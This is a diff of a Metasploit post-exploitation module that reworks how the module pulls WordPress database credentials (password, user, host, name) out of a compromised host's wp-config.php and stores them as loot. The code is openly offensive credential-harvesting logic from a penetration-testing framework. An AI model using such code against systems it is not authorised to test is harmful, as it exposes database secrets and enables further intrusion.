@@ -44,7 +44,6 @@ class MetasploitModule < Msf::Post
     loot = store_loot(ltype, ctype, session, data, fname)
     print_good("#{fname} stored in #{loot}")
     if fname.eql? "wp-config.php"
-      print_good("    Storing Wordpress database credentials")
       db_password = data.scan(/define\('DB_PASSWORD', '(.+)'\)/)[0][0]
       db_user = data.scan(/define\('DB_USER', '(.+)'\)/)[0][0]
       db_host = data.scan(/define\('DB_HOST', '(.+)'\)/)[0][0]
@@ -55,9 +54,9 @@ class MetasploitModule < Msf::Post
         db_host_name = db_host
       end
       db_name = data.scan(/define\('DB_NAME', '(.+)'\)/)[0][0]
-      conn_string = "#{db_user}:#{db_password}@#{db_host_name}:#{db_host_port}/#{db_name}"
-      print_good("    #{db_user}:#{db_password}@#{db_host_name}:#{db_host_port}/#{db_name}")
-      loot = store_loot('db.mysql.cred', ctype, db_host_name, conn_string, fname, conn_string, 'mysql')
+      conn_string = "mysql://#{db_user}:#{db_password}@#{db_host_name}:#{db_host_port}/#{db_name}"
+      print_good("    Storing Wordpress database credentials: #{conn_string}")
+      loot = store_loot('cred.mysql.conn', ctype, db_host_name, conn_string, fname, conn_string, 'mysql')
     end
   end
 
